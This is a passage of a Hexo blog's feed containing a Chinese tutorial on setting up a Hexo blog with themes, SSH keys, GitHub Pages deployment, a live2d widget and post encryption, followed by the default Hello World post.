https://registry.npm.taobao.org</span><br><span class="line"></span><br><span class="line">C:\Program Files\nodejs&gt;npm config get registry</span><br><span class="line">https://registry.npm.taobao.org/</span><br></pre></td></tr></table></figure><h2 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h2><p>本地安装hexo前，应该先创建一个新文件夹blog</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> f:/hexo</span><br><span class="line"></span><br><span class="line">$ npm install hexo-cli -g</span><br><span class="line"></span><br><span class="line">$ hexo init blog</span><br><span class="line"></span><br><span class="line">$ <span class="built_in">cd</span> blog</span><br><span class="line"></span><br><span class="line">$ npm install</span><br><span class="line"></span><br><span class="line">$ hexo g <span class="comment"># 或者hexo generate</span></span><br><span class="line"></span><br><span class="line">$ hexo s <span class="comment"># 或者hexo server，可以在http://localhost:4000/ 查看</span></span><br></pre></td></tr></table></figure><p>hexo命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hexo generate (hexo g) 生成静态文件，会在当前目录下生成一个新的叫做public的文件夹</span><br><span class="line"></span><br><span class="line">hexo server (hexo s) 启动本地web服务，用于博客的预览</span><br><span class="line"></span><br><span class="line">hexo deploy (hexo d) 部署播客到远端（比如github, heroku等平台）</span><br><span class="line"></span><br><span class="line"><span class="variable">$hexo</span> new <span class="string">&quot;postName&quot;</span> <span class="comment">#新建文章</span></span><br><span class="line">$ hexo new page <span class="string">&quot;pageName&quot;</span> <span class="comment">#新建页面</span></span><br><span class="line">$ hexo d -g <span class="comment">#生成部署</span></span><br><span class="line">$ hexo s -g <span class="comment">#生成预览</span></span><br></pre></td></tr></table></figure><p>本地hexo配置情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\admin&gt;hexo -v</span><br><span class="line">hexo-cli: 4.2.0</span><br><span class="line">os: Windows_NT 10.0.19041 win32 x64</span><br><span class="line">node: 14.15.4</span><br><span class="line">v8: 8.4.371.19-node.17</span><br><span class="line">uv: 1.40.0</span><br><span class="line">zlib: 1.2.11</span><br><span class="line">brotli: 1.0.9</span><br><span class="line">ares: 1.16.1</span><br><span class="line">modules: 83</span><br><span class="line">nghttp2: 1.41.0</span><br><span class="line">napi: 7</span><br><span class="line">llhttp: 2.1.3</span><br><span class="line">openssl: 1.1.1i</span><br><span class="line">cldr: 37.0</span><br><span class="line">icu: 67.1</span><br><span class="line">tz: 2020a</span><br><span class="line">unicode: 13.0</span><br></pre></td></tr></table></figure><h1 id="Hexo主题设置"><a href="#Hexo主题设置" class="headerlink" title="Hexo主题设置"></a>Hexo主题设置</h1><p>官方主题推荐：<a href="https://hexo.io/themes/">https://hexo.io/themes/</a></p><h2 id="主题1：stun"><a href="#主题1：stun" class="headerlink" title="主题1：stun"></a>主题1：stun</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p><a href="https://theme-stun.github.io/docs/zh-CN/guide/quick-start.html#%E4%BD%BF%E7%94%A8">帮助文档</a><br>在Hexo 根目录下执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean  </span><br><span class="line"><span class="comment">#该命令的作用是清除缓存，若不输入此命令，服务器有可能更新不了主题</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/liuyib/hexo-theme-stun.git themes/stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装依赖hexo-renderer-pug</span></span><br><span class="line">$ npm install --save hexo-renderer-pug</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>修改Hexo目录下的<code>_config.yml</code>配置文件中的theme属性，将默认的<code>landscape改</code>为为<code>black-blue</code>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: stun</span><br></pre></td></tr></table></figure><p>然后，启动 Hexo 服务器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo s</span><br></pre></td></tr></table></figure><h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/stun</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure><h3 id="本地效果"><a href="#本地效果" class="headerlink" title="本地效果"></a>本地效果</h3><p>访问：<a href="http://localhost:4000/">http://localhost:4000/</a><br><img src="https://img-blog.csdnimg.cn/20210131211931994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="主题优化"><a href="#主题优化" class="headerlink" title="主题优化"></a>主题优化</h3><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ npm install --save hexo-render-pug</span><br><span class="line">$ npm install --save hexo-generator-search</span><br><span class="line">$ npm install --save hexo-deployer-git  </span><br></pre></td></tr></table></figure><p>1.增加页面导航</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo <span class="keyword">new</span> page categories</span><br><span class="line">$ hexo <span class="keyword">new</span> page tags</span><br></pre></td></tr></table></figure><p>在项目目录<code>/source/categories/index.md</code> 加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>: categories</span><br></pre></td></tr></table></figure><p>在项目目录<code>/source/tags/index.md</code> 加上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span>: tags</span><br></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#展示设置</span></span><br><span class="line">title: &#123;$自定义文字&#125;</span><br><span class="line">language: zh-CN </span><br><span class="line">url: &#123;$博客地址&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#主题</span></span><br><span class="line">theme: stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#git相关</span></span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: </span><br><span class="line">  github: &#123;$你的博客仓库&#125;</span><br><span class="line">  gitee: &#123;$你的博客仓库&#125;</span><br><span class="line">  branch: master</span><br><span class="line"></span><br><span class="line"><span class="comment">#搜索相关</span></span><br><span class="line">search:</span><br><span class="line">  path: search.json</span><br><span class="line">  field: post</span><br><span class="line">  content: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>2.修改部署文件夹下/themes/stun/_config.yml(挑选重要部分修改)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#取消导航栏注释（注意空格对齐）</span></span><br><span class="line">menu:</span><br><span class="line">  categories: /categories/ || fas fa-layer-group</span><br><span class="line">  tags: /tags/ || fas fa-tags</span><br><span class="line">  </span><br><span class="line"><span class="comment">#更改图标(最好使用链接地址，我这里使用的图床，图床使用见下一篇博客)</span></span><br><span class="line">favicon:</span><br><span class="line">  small: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-16x16.png</span><br><span class="line">  medium: https://gitee.com/BothSavage/PicGo/raw/master/image/favicon-32x32.png</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改背景大图</span></span><br><span class="line">header:</span><br><span class="line">  bg_image:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">    url: https://gitee.com/BothSavage/PicGo/raw/master/image/背景.png</span><br><span class="line"></span><br><span class="line"><span class="comment">#更改头像大图，并设为圆形</span></span><br><span class="line">author:</span><br><span class="line">  avatar:</span><br><span class="line">    url: https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png</span><br><span class="line">    rounded: <span class="literal">true</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#打开访问统计</span></span><br><span class="line">busuanzi:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  </span><br><span class="line"><span class="comment">#打开搜索功能</span></span><br><span class="line">local_search:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="主题2：black-blue"><a href="#主题2：black-blue" class="headerlink" title="主题2：black-blue"></a>主题2：black-blue</h2><h3 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/maochunguang/black-blue.git themes/stun</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装依赖</span></span><br><span class="line">npm install --save hexo-renderer-jade hexo-renderer-stylus</span><br><span class="line">npm install --save hexo-generator-feed hexo-generator-sitemap hexo-generator-archive hexo-browsersync</span><br></pre></td></tr></table></figure><h3 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: black-blue</span><br></pre></td></tr></table></figure><p>保存然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g <span class="comment"># 生成</span></span><br><span class="line">$ hexo s <span class="comment"># 启动本地web服务器</span></span><br></pre></td></tr></table></figure><h3 id="更新主题"><a href="#更新主题" class="headerlink" title="更新主题"></a>更新主题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> themes/black-blue</span><br><span class="line">$ git pull</span><br></pre></td></tr></table></figure><h2 id="主题3：spfk"><a href="#主题3：spfk" class="headerlink" title="主题3：spfk"></a>主题3：spfk</h2><h3 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/luuman/hexo-theme-spfk.git themes/stun</span><br></pre></td></tr></table></figure><h3 id="使用-2"><a href="#使用-2" class="headerlink" title="使用"></a>使用</h3><p>修改 Hexo 根目录下的 <code>_config.yml</code> 文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">101| theme: black-blue</span><br></pre></td></tr></table></figure><p>保存然后执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean </span><br><span class="line">$ hexo g <span class="comment"># 生成</span></span><br><span class="line">$ hexo s <span class="comment"># 启动本地web服务器</span></span><br></pre></td></tr></table></figure><h3 id="主题优化-1"><a href="#主题优化-1" class="headerlink" title="主题优化"></a>主题优化</h3><p><strong>1.博客个人信息</strong><br>修改Hexo文件夹根目录下的 <code>_config.yml</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#站点标题</span></span><br><span class="line"><span class="number">6</span>| title: Atkx<span class="string">&#x27; blog</span></span><br><span class="line"><span class="string">#作者</span></span><br><span class="line"><span class="string">10| author: Atkx</span></span><br></pre></td></tr></table></figure><p><strong>2.头像设置</strong><br>这里修改主题文件夹下的<code>_config.yml</code> 文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Link to your avatar |填写头像地址</span></span><br><span class="line"><span class="number">16</span>| avatar: img/atkx_32x32.png</span><br><span class="line"><span class="comment"># Small icon of Your site | 站点小图标地址</span></span><br><span class="line"><span class="number">19</span>| favicon: img/atkx_16x16.png</span><br></pre></td></tr></table></figure><h1 id="Hexo部署到github"><a href="#Hexo部署到github" class="headerlink" title="Hexo部署到github"></a>Hexo部署到github</h1><h2 id="配置github-ssh"><a href="#配置github-ssh" class="headerlink" title="配置github ssh"></a>配置github ssh</h2><blockquote><p>只有配置好 SSH 密钥后，我们才可以通过 git 操作实现本地代码库与 Github 代码库同步。</p></blockquote><p>在你第一次新建的文件夹里面，点击 Git Bash Here 输入以下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C <span class="string">&quot;你的邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>生成一对密钥 SSH key，持续enter。</p><p>在路径<code>C:\Users\admin\.ssh</code>下找到<code>id_rsa.pub</code>，用记事本打开，复制里面的内容。</p><p>配置路径：github 网站–&gt;Settings–&gt;SSH and GPG keys–&gt;NEW SSH KEY ,title随便填写，把上面复制的内容粘贴进Key里面，点击Add SSH key。</p><p><img src="https://img-blog.csdnimg.cn/20210131144015618.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>输入命令检验是否成功。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi swhat! You<span class="string">&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure><h2 id="部署文件"><a href="#部署文件" class="headerlink" title="部署文件"></a>部署文件</h2><p>用sublime打开blog下创建的用户名文件进行部署（将文件直接拖进去就可以了）打开仓库<code>_config.yml</code> 配置文件，</p><p>第16行,更改url</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://swhat.github.io</span><br></pre></td></tr></table></figure><p>拉到文件末尾，填上如下配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="comment">## Docs: https://hexo.io/docs/one-command-deployment</span></span><br><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/swhat/swhat.github.io.git </span><br><span class="line">  <span class="comment">#仓库名字改成自己的</span></span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure><p><em>若端口冲突，也可以在<code>_config.yml</code>中添加</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">server:</span><br><span class="line">  port: 4001 <span class="comment">#端口号随意，默认是4000</span></span><br><span class="line">  compress: <span class="literal">true</span></span><br><span class="line">  header: <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>进入你的swhat目录，执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo g -d</span><br></pre></td></tr></table></figure><p>会报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR Deployer not found: git</span><br></pre></td></tr></table></figure><p>安装依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-deployer-git</span><br></pre></td></tr></table></figure><p>重新执行<code>hexo g -d</code>，在弹出的框子中，输入github用户名和密码<br><img src="https://img-blog.csdnimg.cn/20210131153540546.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>命令行也输入github用户名和密码<br><img src="https://img-blog.csdnimg.cn/20210131210759817.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="网站效果"><a href="#网站效果" class="headerlink" title="网站效果"></a>网站效果</h2><p>访问：<a href="https://swhat.github.io/">https://swhat.github.io</a><br><img src="https://img-blog.csdnimg.cn/20210131210907129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h2 id="发布文章"><a href="#发布文章" class="headerlink" title="发布文章"></a>发布文章</h2><p>方法一：新建一个空文章，输入以下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo n <span class="string">&quot;文章标题&quot;</span></span><br></pre></td></tr></table></figure><p>如：执行<code>hexo new &quot;My New Post&quot;</code>，会在项目 <code>\Hexo\source\_posts</code> 中生成 My New Post.md 文件，可以进行编辑。</p><p>方法二：也可以在项目 <code>\Hexo\source\_posts</code>下，新建md 文件，然后添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">title: 文章标题</span><br><span class="line">date: 时间，如2020-02-02 02:02:02</span><br><span class="line">categories: 类别</span><br><span class="line">tags:  标签</span><br></pre></td></tr></table></figure><p>在md文章中添加下面的句子，该句子以上可以显示你想显示的内容。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- more --&gt;</span><br></pre></td></tr></table></figure><p>当我们用编辑器写好文章后，可以使用以下命令将其推送到服务器上</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo g -d</span><br></pre></td></tr></table></figure><h1 id="博客优化"><a href="#博客优化" class="headerlink" title="博客优化"></a>博客优化</h1><h2 id="添加看板娘"><a href="#添加看板娘" class="headerlink" title="添加看板娘"></a>添加看板娘</h2><p>1、安装模块<br>    在hexo根目录执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-helper-live2d</span><br></pre></td></tr></table></figure><p>可以在<code>package.json</code>查看是否安装成功<br><img src="https://img-blog.csdnimg.cn/20210203145531821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>此时再去 node_moduels目录下，可以看到有如下文件夹，这些都是动画主配置<br><img src="https://img-blog.csdnimg.cn/2021020314565224.png" alt="在这里插入图片描述"></p><p>2、下载模型<br>地址：<a href="https://github.com/xiazeyu/live2d-widget-models.git">https://github.com/xiazeyu/live2d-widget-models.git</a></p><p>下载好之后将<code>packages</code>里的所有动画模板拷贝到博客的<code>node_modules</code>目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">live2d-widget-model-chitose</span><br><span class="line">live2d-widget-model-epsilon2_1</span><br><span class="line">live2d-widget-model-gf</span><br><span class="line">live2d-widget-model-haru</span><br><span class="line">live2d-widget-model-haruto</span><br><span class="line">live2d-widget-model-hibiki</span><br><span class="line">live2d-widget-model-hijiki</span><br><span class="line">live2d-widget-model-izumi</span><br><span class="line">live2d-widget-model-koharu</span><br><span class="line">live2d-widget-model-miku</span><br><span class="line">live2d-widget-model-ni-j</span><br><span class="line">live2d-widget-model-nico</span><br><span class="line">live2d-widget-model-nietzsche</span><br><span class="line">live2d-widget-model-nipsilon</span><br><span class="line">live2d-widget-model-nito</span><br><span class="line">live2d-widget-model-shizuku</span><br><span class="line">live2d-widget-model-tororo</span><br><span class="line">live2d-widget-model-tsumiki</span><br><span class="line">live2d-widget-model-unitychan</span><br><span class="line">live2d-widget-model-wanko</span><br><span class="line">live2d-widget-model-z16</span><br></pre></td></tr></table></figure><p>也可以挑选自己喜欢的模型，使用命令安装模型，例如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install live2d-widget-model-haruto</span><br></pre></td></tr></table></figure><p>4.详细配置<br>在Hexo的 _config.yml 文件或主题的 _config.yml 文件中添加配置.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">live2d:</span><br><span class="line">  <span class="built_in">enable</span>: <span class="literal">true</span></span><br><span class="line">  pluginModelPath: assets/</span><br><span class="line">  model:</span><br><span class="line">    use: live2d-widget-model-haruto  </span><br><span class="line">    <span class="comment">#模板目录，在node_modules里，这里是模型名称</span></span><br><span class="line">  display:</span><br><span class="line">    position: right</span><br><span class="line">    width: 150 </span><br><span class="line">    height: 300</span><br><span class="line">  mobile:</span><br><span class="line">    show: <span class="literal">false</span>  <span class="comment">#是否在手机进行显示</span></span><br></pre></td></tr></table></figure><h2 id="博客加密"><a href="#博客加密" class="headerlink" title="博客加密"></a>博客加密</h2><p>1.安装encrypt插件<br>在博客目录下执行下面的指令安装encrypt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-blog-encrypt</span><br></pre></td></tr></table></figure><p>安装完成后，在package.json文件的dependecies依赖中看到encrypt插件<br><img src="https://img-blog.csdnimg.cn/20210205121402142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2 . 加密文章设置<br>将”password”字段添加到文章信息头部：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">title: 文章标题</span><br><span class="line">date: 时间，如2020-02-02 02:02:02</span><br><span class="line">categories: 类别</span><br><span class="line">tags:  标签</span><br><span class="line">password: 123456</span><br><span class="line">abstract: 这里有东西被加密了，需要输入密码查看哦。</span><br><span class="line">message: 您好，这里需要密码。</span><br><span class="line">wrong_pass_message: 抱歉，这个密码看着不太对，请再试试。</span><br><span class="line">wrong_hash_message: 抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。</span><br></pre></td></tr></table></figure><p>效果图<br><img src="https://img-blog.csdnimg.cn/202102051217264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>注意：本文所有命令均在git命令行使用</strong></p><p>参考文章：<br><a href="https://www.imooc.com/article/313424">Hexo结合Stun静态博客搭建从入门到入土</a><br><a href="https://www.jianshu.com/p/3a6342e16e57">hexo 添加live2d看板动画</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;摘要：使用Hexo+github搭建博客&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://swhat.github.io/categories/CTF/"/>
    
    
    <category term="搭建博客" scheme="https://swhat.github.io/tags/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="https://swhat.github.io/2020/02/02/hello-world/"/>
    <id>https://swhat.github.io/2020/02/02/hello-world/</id>
    <published>2020-02-01T18:02:02.000Z</published>
    <updated>2021-02-05T04:19:06.601Z</updated>
    
    <content type="html"><![CDATA[<p>Hello World</p><a id="more"></a><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td 